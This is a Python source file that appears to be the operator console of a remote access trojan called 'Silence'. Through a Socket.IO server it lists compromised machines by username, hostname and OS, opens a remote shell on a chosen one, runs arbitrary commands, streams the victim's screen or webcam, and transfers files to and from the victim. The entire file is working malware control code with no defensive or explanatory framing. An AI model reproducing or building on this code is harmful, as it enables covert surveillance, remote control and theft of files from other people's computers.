import socketio
import time
import os
from rich.console import Console
from rich.table import Table
import requests

HELP = """Commands:
    shell [id] - Sets the current shell
    list [online] - Lists clients
    update - Updates the current shell
    clear - Clears the console
"""

SHELL_HELP = """Commands:
    stream [cam/screen] - Starts a stream from the screen or the webcam
    kstream - Kills the current stream
    upload [file] - Uploads a file from client to server
    download [file] [path] - Downloads a file from server to path on client side
    clear - Clears the console
    exit - Kills current shell
    [...] - All cmd commands e.g mkdir, rmdir, ls, cd
"""


class Shell:
    def __init__(self, host):
        self.host = host
        self.sio_client = socketio.Client()
        self.condition_responded = False
        self.clients = None
        self.current_shell = None
        self.console = Console()

        @self.sio_client.on('response')
        def on_response(res):
            if type(res["data"]) is bool:
                self.bool_data_print(res["data"])
            elif type(res["data"]) is list:
                self.list_data_print(res["data"])
            else:
                self.console.print(res["data"])
            self.condition_responded = True

    def run(self):
        self.sio_client.connect(self.host)
        self.sio_client.emit("get_data", callback=self.on_data)
        self.sync_responded()
        self.command_loop()

    def command_loop(self):
        while True:
            if self.current_shell is None:
                command = self.get_input()
                self.process_command(command.strip())
            else:
                command = self.get_input(self.clients[self.current_shell]["hostname"] + " ")
                self.process_shell_command(command.strip())

            self.sync_responded()

    def process_command(self, cli):
        cli_spl = cli.split(" ")

        if cli_spl[0] == "help":
            self.console.print(HELP)
        elif cli_spl[0] == "list":
            self.print_shell_options()
        elif cli_spl[0] == "shell":
            self.set_current_shell(int(cli_spl[1]))
            self.console.clear()
        elif cli_spl[0] == "update":
            self.sio_client.emit("get_data", callback=self.on_data)
            self.sync_responded()
        elif cli_spl[0] == "clear":
            self.console.clear()
        else:
            self.print_error_msg("Invalid command")

    def process_shell_command(self, cli):
        cli_spl = cli.split(" ")

        if cli_spl[0] == "help":
            self.console.print(SHELL_HELP)
        elif cli_spl[0] == "stream":
            self.send_command({"event": "stream", "from_screen": cli_spl[1] != "cam"})
        elif cli_spl[0] == "kstream":
            self.send_command({"event": "kstream"})
        elif cli_spl[0] == "cd":
            self.send_command({"event": "cd", "path": cli_spl[1]})
        elif cli_spl[0] == "origin":
            self.send_command({"event": "origin"})
        elif cli_spl[0] == "download":
            self.send_command({"event": "download", "file": os.path.basename(cli_spl[1]), "path": cli_spl[2]})
        elif cli_spl[0] == "upload":
            self.send_command({"event": "upload", "file": cli_spl[1]})
        elif cli_spl[0] == "clear":
            self.console.clear()
        elif cli_spl[0] == "exit":
            self.current_shell = None
        else:
            self.send_command({"event": "cmd", "command": cli})

    def send_command(self, data):
        self.condition_responded = False
        self.sio_client.emit("command", {**data, "id": self.current_shell})
        self.sync_responded()

    def set_current_shell(self, index):
        self.current_shell = index

        if self.current_shell >= len(self.clients) or self.current_shell < 0:
            self.current_shell = None
            self.print_error_msg("Invalid shell")

    def get_input(self, msg=""):
        self.console.print(f"[bold cyan]{msg}>>[/bold cyan] ", end="")
        return input("")

    def print_error_msg(self, msg):
        self.console.print(f"[bold red]{msg}[/bold red]")

    def print_shell_options(self):
        client_table = Table(title="Silence clients")

        client_table.add_column("ID", justify="right", style="cyan", no_wrap=True)
        client_table.add_column("Username", justify="right", style="cyan", no_wrap=True)
        client_table.add_column("Hostname", style="magenta")
        client_table.add_column("OS", justify="left", style="green")

        for client in self.clients:
            client_table.add_row(str(client["id"]), client["username"], client["hostname"], client["os"])

        self.console.print(client_table)

    def bool_data_print(self, data: bool):
        if data:
            self.console.print("[bold green]Successfully executed command[/bold green]")
        else:
            self.print_error_msg("Error while executing command")

    def list_data_print(self, data):
        for d in data:
            self.console.print("[bold green]" + d + "[/bold green]")

    def sync_responded(self):
        while not self.condition_responded:
            time.sleep(0.3)

    def on_data(self, data):
        self.clients = data
        self.condition_responded = True
